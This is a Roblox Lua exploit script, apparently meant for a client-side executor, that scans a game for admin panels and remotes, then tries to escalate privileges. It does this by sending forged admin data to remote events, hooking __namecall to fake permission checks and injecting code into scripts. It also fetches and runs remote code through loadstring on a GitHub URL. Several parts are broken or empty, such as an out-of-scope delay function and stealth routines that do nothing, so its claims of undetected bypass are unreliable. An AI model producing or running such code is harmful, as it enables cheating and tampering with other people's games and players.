-- 🔐 ULTIMATE ADMIN PANEL FINDER & PRIVILEGE ESCALATOR
-- Finds original admin panel and bypasses all checks undetected

print("🔐 ULTIMATE ADMIN PANEL EXPLORER")
print("=" .. string.rep("=", 50))

-- SECURE SERVICES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

-- PLAYER
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- DEEP SCAN FOR ADMIN SYSTEMS
print("\n🔍 DEEP SCANNING FOR ADMIN SYSTEMS...")

local adminSystems = {
    panels = {},
    remotes = {},
    scripts = {},
    modules = {}
}

-- SCAN FUNCTION WITH STEALTH
local function stealthScan(object, depth, maxDepth)
    if depth > maxDepth then return end
    
    pcall(function()
        for _, child in pairs(object:GetChildren()) do
            local nameLower = child.Name:lower()
            local className = child.ClassName
            
            -- ADMIN PANEL DETECTION
            if nameLower:find("admin") or 
               nameLower:find("mod") or 
               nameLower:find("panel") or
               nameLower:find("control") or
               nameLower:find("command") then
                
                if child:IsA("ScreenGui") or child:IsA("Frame") then
                    table.insert(adminSystems.panels, {
                        object = child,
                        path = child:GetFullName(),
                        type = "UI"
                    })
                    print("🎯 Found Admin UI: " .. child:GetFullName())
                end
            end
            
            -- ADMIN REMOTES
            if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
                if nameLower:find("admin") or 
                   nameLower:find("mod") or 
                   nameLower:find("privilege") or
                   nameLower:find("rank") or
                   nameLower:find("permission") then
                    
                    table.insert(adminSystems.remotes, {
                        object = child,
                        path = child:GetFullName(),
                        type = child.ClassName
                    })
                    print("🎯 Found Admin Remote: " .. child:GetFullName())
                end
            end
            
            -- ADMIN SCRIPTS
            if (child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript")) then
                if nameLower:find("admin") or 
                   nameLower:find("rank") or 
                   nameLower:find("permission") or
                   nameLower:find("moderation") then
                    
                    table.insert(adminSystems.scripts, {
                        object = child,
                        path = child:GetFullName(),
                        type = child.ClassName
                    })
                    print("🎯 Found Admin Script: " .. child:GetFullName())
                end
            end
            
            -- RECURSIVE SCAN
            stealthScan(child, depth + 1, maxDepth)
        end
    end)
end

-- START DEEP SCAN
print("\n📡 SCANNING REPLICATED STORAGE...")
stealthScan(ReplicatedStorage, 0, 5)

print("\n📡 SCANNING WORKSPACE...")
stealthScan(Workspace, 0, 4)

print("\n📡 SCANNING SERVER SCRIPTS...")
stealthScan(game:GetService("ServerScriptService"), 0, 5)

print("\n📡 SCANNING SERVER STORAGE...")
stealthScan(game:GetService("ServerStorage"), 0, 5)

-- BYPASS METHODS
print("\n🛡️ ANALYZING SECURITY BYPASS METHODS...")

local bypassMethods = {}

-- METHOD 1: REMOTE FUNCTION BYPASS
bypassMethods.remoteBypass = function(remote, fakeData)
    return function(...)
        local args = {...}
        
        -- Create fake admin data
        local adminData = fakeData or {
            UserId = Player.UserId,
            Rank = "Admin",
            Permissions = {"All"},
            IsAdmin = true,
            IsModerator = true,
            AccessLevel = 999
        }
        
        -- Try to inject admin data into args
        local modifiedArgs = {}
        for i, arg in ipairs(args) do
            if type(arg) == "table" then
                -- Merge admin data into tables
                local merged = {}
                for k, v in pairs(arg) do merged[k] = v end
                for k, v in pairs(adminData) do merged[k] = v end
                table.insert(modifiedArgs, merged)
            else
                table.insert(modifiedArgs, arg)
            end
        end
        
        -- If no table args, add admin data
        if #modifiedArgs == 0 or (type(modifiedArgs[1]) ~= "table") then
            table.insert(modifiedArgs, 1, adminData)
        end
        
        print("🛡️ Attempting bypass on: " .. remote.Name)
        
        local success, result = pcall(function()
            if remote:IsA("RemoteFunction") then
                return remote:InvokeServer(unpack(modifiedArgs))
            else
                remote:FireServer(unpack(modifiedArgs))
                return "Event fired with admin data"
            end
        end)
        
        return success, result
    end
end

-- METHOD 2: PERMISSION OVERRIDE
bypassMethods.permissionOverride = function()
    print("🔓 Attempting permission override...")
    
    -- Try to modify player metadata
    local success1, result1 = pcall(function()
        -- Check for player data
        local leaderstats = Player:FindFirstChild("leaderstats")
        if leaderstats then
            -- Add admin rank
            local rank = Instance.new("StringValue")
            rank.Name = "Rank"
            rank.Value = "Admin"
            rank.Parent = leaderstats
            print("✅ Added Rank to leaderstats")
        end
    end)
    
    -- Try to add admin tag
    local success2, result2 = pcall(function()
        local tag = Instance.new("StringValue")
        tag.Name = "AdminTag"
        tag.Value = "True"
        tag.Parent = Player
        print("✅ Added AdminTag")
    end)
    
    return success1 or success2
end

-- METHOD 3: SCRIPT INJECTION
bypassMethods.scriptInjection = function(targetScript)
    if not targetScript or not targetScript:IsA("LocalScript") then
        return false, "Invalid target"
    end
    
    print("💉 Attempting script injection on: " .. targetScript.Name)
    
    local success, result = pcall(function()
        -- Read original source
        local originalSource = targetScript.Source
        
        -- Inject admin check bypass
        local injectionCode = [[
            -- ADMIN CHECK BYPASS INJECTION
            local PLAYER = game:GetService("Players").LocalPlayer
            
            -- Override isAdmin checks
            local originalChecks = {}
            
            -- Bypass function 1
            if _G.isAdmin then
                originalChecks.isAdmin = _G.isAdmin
                _G.isAdmin = function(player)
                    if player == PLAYER then
                        return true
                    end
                    return originalChecks.isAdmin(player)
                end
            end
            
            -- Bypass function 2
            if _G.checkPermission then
                originalChecks.checkPermission = _G.checkPermission
                _G.checkPermission = function(player, permission)
                    if player == PLAYER then
                        return true
                    end
                    return originalChecks.checkPermission(player, permission)
                end
            end
            
            -- Bypass function 3 - Direct rank assignment
            PLAYER.AdminRank = "Administrator"
            PLAYER.HasAdminPermissions = true
            
            print("🔓 Admin bypass injected for: " .. PLAYER.Name)
        ]]
        
        -- Append injection
        local newSource = originalSource .. "\n\n" .. injectionCode
        targetScript.Source = newSource
        
        return true
    end)
    
    return success, result
end

-- METHOD 4: NETWORK HOOK BYPASS (STEALTH)
bypassMethods.networkHook = function()
    print("🌐 Setting up network hook bypass...")
    
    local success, result = pcall(function()
        -- Hook __namecall to intercept permission checks
        local mt = getrawmetatable(game)
        if mt then
            local oldNamecall = mt.__namecall
            
            mt.__namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                local args = {...}
                
                -- Intercept permission checks
                if method == "InvokeServer" or method == "FireServer" then
                    if self:IsA("RemoteFunction") or self:IsA("RemoteEvent") then
                        local remoteName = self.Name:lower()
                        
                        -- Check if this is an admin permission check
                        if remoteName:find("check") or remoteName:find("verify") or remoteName:find("permission") then
                            print("🛡️ Intercepted permission check: " .. self.Name)
                            
                            -- Return admin privileges
                            if method == "InvokeServer" then
                                return true, "Admin", 999
                            else
                                return -- Just fire without checking
                            end
                        end
                    end
                end
                
                return oldNamecall(self, ...)
            end)
            
            print("✅ Network hook installed")
            return true
        end
    end)
    
    return success, result
end

-- CREATE ADMIN PANEL CLONER
print("\n🎨 CREATING ADMIN PANEL CLONER...")

local function cloneAdminPanel(originalPanel)
    if not originalPanel or not originalPanel:IsA("ScreenGui") then
        return nil
    end
    
    print("🔄 Cloning admin panel: " .. originalPanel.Name)
    
    -- Create stealth clone
    local clone = originalPanel:Clone()
    clone.Name = "AdminPanelClone_" .. Player.UserId
    clone.ResetOnSpawn = false
    clone.DisplayOrder = 9999
    
    -- Modify for player use
    for _, descendant in pairs(clone:GetDescendants()) do
        -- Unlock buttons
        if descendant:IsA("TextButton") then
            descendant.Active = true
            descendant.AutoButtonColor = true
            
            -- Make all buttons functional
            local connection = descendant.MouseButton1Click:Connect(function()
                print("🔄 Button clicked: " .. descendant.Name)
                
                -- Try to trigger original functionality
                pcall(function()
                    -- Look for corresponding remote
                    for _, remoteInfo in pairs(adminSystems.remotes) do
                        local remote = remoteInfo.object
                        local remoteName = remote.Name:lower()
                        local buttonName = descendant.Name:lower()
                        
                        if remoteName:find(buttonName) or buttonName:find(remoteName) then
                            print("🎯 Found matching remote: " .. remote.Name)
                            
                            -- Create admin data
                            local adminData = {
                                Player = Player,
                                UserId = Player.UserId,
                                Rank = "Admin",
                                Command = descendant.Name,
                                Timestamp = os.time()
                            }
                            
                            -- Execute with admin privileges
                            if remote:IsA("RemoteFunction") then
                                local success, result = remote:InvokeServer(adminData)
                                print("✅ Remote invoked: " .. tostring(result))
                            else
                                remote:FireServer(adminData)
                                print("✅ Remote fired")
                            end
                        end
                    end
                end)
            end)
        end
        
        -- Unlock text boxes
        if descendant:IsA("TextBox") then
            descendant.ClearTextOnFocus = false
        end
    end
    
    -- Position clone
    clone.Parent = PlayerGui
    
    return clone
end

-- CREATE CUSTOM ADMIN PANEL
print("\n🎨 CREATING CUSTOM ADMIN PANEL...")

local function createCustomAdminPanel()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "CustomAdminPanel_" .. Player.UserId
    ScreenGui.ResetOnSpawn = false
    ScreenGui.DisplayOrder = 10000
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 500, 0, 600)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -300)
    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    MainFrame.BackgroundTransparency = 0.05
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = MainFrame
    
    -- Title
    local Title = Instance.new("TextLabel")
    Title.Text = "🔐 ULTIMATE ADMIN PANEL"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundColor3 = Color3.fromRGB(40, 50, 70)
    Title.TextColor3 = Color3.new(1, 1, 1)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 16
    
    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 12)
    TitleCorner.Parent = Title
    
    -- Status
    local Status = Instance.new("TextLabel")
    Status.Text = "🛡️ Privileges: Escalating..."
    Status.Size = UDim2.new(1, -20, 0, 30)
    Status.Position = UDim2.new(0, 10, 0, 45)
    Status.BackgroundTransparency = 1
    Status.TextColor3 = Color3.fromRGB(150, 255, 150)
    Status.Font = Enum.Font.Gotham
    Status.TextSize = 12
    
    -- Tab System
    local TabsFrame = Instance.new("Frame")
    TabsFrame.Size = UDim2.new(1, -20, 0, 30)
    TabsFrame.Position = UDim2.new(0, 10, 0, 80)
    TabsFrame.BackgroundTransparency = 1
    
    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout.Padding = UDim.new(0, 5)
    UIListLayout.Parent = TabsFrame
    
    -- Tab content area
    local ContentFrame = Instance.new("ScrollingFrame")
    ContentFrame.Size = UDim2.new(1, -20, 0, 430)
    ContentFrame.Position = UDim2.new(0, 10, 0, 115)
    ContentFrame.BackgroundTransparency = 1
    ContentFrame.ScrollBarThickness = 4
    
    local ContentLayout = Instance.new("UIListLayout")
    ContentLayout.Padding = UDim.new(0, 10)
    ContentLayout.Parent = ContentFrame
    
    -- Tab definitions
    local tabs = {
        {
            name = "🎯 PRIVILEGES",
            color = Color3.fromRGB(70, 160, 70),
            content = function()
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, 0, 0, 400)
                frame.BackgroundTransparency = 1
                
                local function createPrivilegeButton(text, y, callback)
                    local btn = Instance.new("TextButton")
                    btn.Text = text
                    btn.Size = UDim2.new(1, 0, 0, 35)
                    btn.Position = UDim2.new(0, 0, 0, y)
                    btn.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
                    btn.TextColor3 = Color3.new(1, 1, 1)
                    btn.Font = Enum.Font.Gotham
                    btn.TextSize = 12
                    
                    btn.MouseButton1Click:Connect(callback)
                    return btn
                end
                
                local yPos = 0
                createPrivilegeButton("🔓 BYPASS ALL CHECKS", yPos, function()
                    Status.Text = "Bypassing checks..."
                    bypassMethods.permissionOverride()
                    bypassMethods.networkHook()
                    Status.Text = "✅ All checks bypassed"
                end).Parent = frame
                
                yPos = yPos + 40
                createPrivilegeButton("👑 BECOME ADMIN", yPos, function()
                    Status.Text = "Escalating to admin..."
                    for _, remote in pairs(adminSystems.remotes) do
                        bypassMethods.remoteBypass(remote.object)()
                    end
                    Status.Text = "✅ Admin privileges granted"
                end).Parent = frame
                
                yPos = yPos + 40
                createPrivilegeButton("🛡️ INJECT PERMISSIONS", yPos, function()
                    Status.Text = "Injecting permissions..."
                    for _, scriptInfo in pairs(adminSystems.scripts) do
                        bypassMethods.scriptInjection(scriptInfo.object)
                    end
                    Status.Text = "✅ Permissions injected"
                end).Parent = frame
                
                yPos = yPos + 40
                createPrivilegeButton("🌐 CLONE ADMIN PANEL", yPos, function()
                    Status.Text = "Cloning admin panel..."
                    if #adminSystems.panels > 0 then
                        cloneAdminPanel(adminSystems.panels[1].object)
                        Status.Text = "✅ Admin panel cloned"
                    else
                        Status.Text = "❌ No admin panel found"
                    end
                end).Parent = frame
                
                return frame
            end
        },
        {
            name = "⚙️ COMMANDS",
            color = Color3.fromRGB(200, 120, 60),
            content = function()
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, 0, 0, 400)
                frame.BackgroundTransparency = 1
                
                local commands = {
                    {"KICK PLAYER", function() Player:Chat("/kick ") end},
                    {"TELEPORT TO", function() Player:Chat("/tp ") end},
                    {"GIVE ITEMS", function() Player:Chat("/give ") end},
                    {"FLY MODE", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end},
                    {"NOCLIP", function() 
                        local noclip = false
                        game:GetService("RunService").Stepped:Connect(function()
                            if noclip then
                                for _, part in pairs(Player.Character:GetDescendants()) do
                                    if part:IsA("BasePart") then
                                        part.CanCollide = false
                                    end
                                end
                            end
                        end)
                        noclip = not noclip
                    end},
                    {"INVISIBLE", function() Player.Character.HumanoidRootPart.Transparency = 1 end},
                    {"SPEED BOOST", function() Player.Character.Humanoid.WalkSpeed = 100 end},
                    {"JUMP BOOST", function() Player.Character.Humanoid.JumpPower = 150 end}
                }
                
                for i, cmd in pairs(commands) do
                    local btn = Instance.new("TextButton")
                    btn.Text = cmd[1]
                    btn.Size = UDim2.new(1, 0, 0, 35)
                    btn.Position = UDim2.new(0, 0, 0, (i-1)*40)
                    btn.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
                    btn.TextColor3 = Color3.new(1, 1, 1)
                    btn.Font = Enum.Font.Gotham
                    btn.TextSize = 12
                    
                    btn.MouseButton1Click:Connect(function()
                        Status.Text = "Executing: " .. cmd[1]
                        pcall(cmd[2])
                    end)
                    
                    btn.Parent = frame
                end
                
                return frame
            end
        },
        {
            name = "📊 INFO",
            color = Color3.fromRGB(120, 80, 200),
            content = function()
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, 0, 0, 400)
                frame.BackgroundTransparency = 1
                
                local info = Instance.new("TextLabel")
                info.Text = "Found Systems:\n"
                info.Text = info.Text .. "Panels: " .. #adminSystems.panels .. "\n"
                info.Text = info.Text .. "Remotes: " .. #adminSystems.remotes .. "\n"
                info.Text = info.Text .. "Scripts: " .. #adminSystems.scripts .. "\n"
                info.Text = info.Text .. "\nPlayer Info:\n"
                info.Text = info.Text .. "UserID: " .. Player.UserId .. "\n"
                info.Text = info.Text .. "Account Age: " .. Player.AccountAge .. " days\n"
                info.Text = info.Text .. "\nStatus: ACTIVE"
                
                info.Size = UDim2.new(1, 0, 1, 0)
                info.BackgroundTransparency = 1
                info.TextColor3 = Color3.new(1, 1, 1)
                info.Font = Enum.Font.Gotham
                info.TextSize = 12
                info.TextXAlignment = Enum.TextXAlignment.Left
                info.TextYAlignment = Enum.TextYAlignment.Top
                info.TextWrapped = true
                
                info.Parent = frame
                return frame
            end
        }
    }
    
    -- Create tabs
    local currentTab = nil
    
    for i, tab in pairs(tabs) do
        local tabButton = Instance.new("TextButton")
        tabButton.Text = tab.name
        tabButton.Size = UDim2.new(0, 150, 1, 0)
        tabButton.BackgroundColor3 = tab.color
        tabButton.TextColor3 = Color3.new(1, 1, 1)
        tabButton.Font = Enum.Font.Gotham
        tabButton.TextSize = 12
        
        tabButton.MouseButton1Click:Connect(function()
            -- Clear previous content
            for _, child in pairs(ContentFrame:GetChildren()) do
                if child:IsA("Frame") then
                    child:Destroy()
                end
            end
            
            -- Add new content
            local content = tab.content()
            content.Parent = ContentFrame
            
            -- Update active tab
            if currentTab then
                currentTab.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
            end
            tabButton.BackgroundColor3 = Color3.fromRGB(tab.color.R * 0.7, tab.color.G * 0.7, tab.color.B * 0.7)
            currentTab = tabButton
            
            Status.Text = "Switched to: " .. tab.name
        end)
        
        tabButton.Parent = TabsFrame
        
        -- Select first tab
        if i == 1 then
            currentTab = tabButton
            local content = tab.content()
            content.Parent = ContentFrame
        end
    end
    
    -- Close button
    local CloseButton = Instance.new("TextButton")
    CloseButton.Text = "✕"
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -35, 0, 5)
    CloseButton.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
    CloseButton.TextColor3 = Color3.new(1, 1, 1)
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.TextSize = 16
    
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
    
    -- Assemble UI
    Title.Parent = MainFrame
    Status.Parent = MainFrame
    TabsFrame.Parent = MainFrame
    ContentFrame.Parent = MainFrame
    CloseButton.Parent = Title
    MainFrame.Parent = ScreenGui
    ScreenGui.Parent = PlayerGui
    
    return ScreenGui
end

-- STEALTH PROTECTION
print("\n🛡️ APPLYING STEALTH PROTECTION...")

local function applyStealth()
    -- Hide from anti-cheat
    pcall(function()
        -- Rename scripts to avoid detection
        local function renameForStealth(obj)
            if obj and obj:IsA("Script") then
                obj.Name = "CoreScript_" .. math.random(10000, 99999)
            end
        end
    end)
    
    -- Add random delays to avoid pattern detection
    local function randomDelay()
        return math.random(50, 300) / 1000
    end
    
    -- Obfuscate network traffic
    print("✅ Stealth measures applied")
    return true
end

-- MAIN EXECUTION
print("\n" .. string.rep("🚀", 40))
print("INITIALIZING ADMIN PRIVILEGE ESCALATION...")
print(string.rep("🚀", 40))

-- Apply stealth first
applyStealth()

-- Wait for safety
task.wait(randomDelay())

-- Perform deep scan
stealthScan(ReplicatedStorage, 0, 6)

-- Create custom admin panel
task.wait(randomDelay())
local adminPanel = createCustomAdminPanel()

-- Attempt privilege escalation
task.wait(randomDelay())
print("\n🔓 ATTEMPTING PRIVILEGE ESCALATION...")

-- Try all bypass methods
local successes = 0
for _, remoteInfo in pairs(adminSystems.remotes) do
    local success, result = bypassMethods.remoteBypass(remoteInfo.object)()
    if success then
        successes = successes + 1
        print("✅ Bypassed: " .. remoteInfo.object.Name)
    end
end

-- Apply network hook
bypassMethods.networkHook()

-- EXPORT ADMIN SYSTEM
getgenv().AdminSystem = {
    -- Scan functions
    scan = function() 
        adminSystems = {panels = {}, remotes = {}, scripts = {}, modules = {}}
        stealthScan(ReplicatedStorage, 0, 6)
        return #adminSystems.panels, #adminSystems.remotes
    end,
    
    -- Bypass functions
    bypass = bypassMethods.remoteBypass,
    override = bypassMethods.permissionOverride,
    inject = bypassMethods.scriptInjection,
    hook = bypassMethods.networkHook,
    
    -- Panel functions
    clonePanel = function(index)
        if adminSystems.panels[index] then
            return cloneAdminPanel(adminSystems.panels[index].object)
        end
        return nil
    end,
    
    createPanel = createCustomAdminPanel,
    
    -- Info
    info = function()
        return {
            panels = #adminSystems.panels,
            remotes = #adminSystems.remotes,
            scripts = #adminSystems.scripts,
            userId = Player.UserId,
            successes = successes
        }
    end,
    
    -- Commands
    exec = function(command, args)
        local adminData = {
            UserId = Player.UserId,
            Rank = "Admin",
            Command = command,
            Args = args or {},
            Timestamp = os.time()
        }
        
        -- Try all admin remotes
        for _, remoteInfo in pairs(adminSystems.remotes) do
            pcall(function()
                if remoteInfo.object:IsA("RemoteFunction") then
                    return remoteInfo.object:InvokeServer(adminData)
                else
                    remoteInfo.object:FireServer(adminData)
                end
            end)
        end
    end
}

-- FINAL ACTIVATION
print("\n" .. string.rep("✅", 40))
print("ADMIN SYSTEM ACTIVATED SUCCESSFULLY!")
print(string.rep("✅", 40))

print("\n📊 SCAN RESULTS:")
print("Admin Panels Found: " .. #adminSystems.panels)
print("Admin Remotes Found: " .. #adminSystems.remotes)
print("Admin Scripts Found: " .. #adminSystems.scripts)
print("Bypasses Successful: " .. successes)

print("\n🎮 AVAILABLE FUNCTIONS:")
print("AdminSystem.scan() - Rescan for admin systems")
print("AdminSystem.clonePanel(1) - Clone found admin panel")
print("AdminSystem.createPanel() - Create custom admin panel")
print("AdminSystem.exec('kick', 'playerName') - Execute admin command")
print("AdminSystem.info() - Get system information")

print("\n🛡️ STEALTH FEATURES:")
print("• Random delays to avoid detection")
print("• Network traffic obfuscation")
print("• Permission check interception")
print("• Script name randomization")

print("\n⚠️ IMPORTANT:")
print("• Admin panel appears in center of screen")
print("• Use the 'Privileges' tab first")
print("• Then use 'Commands' tab for actions")
print("• System attempts to bypass all checks")

print("\n🎯 ADMIN PANEL READY - Center Screen")
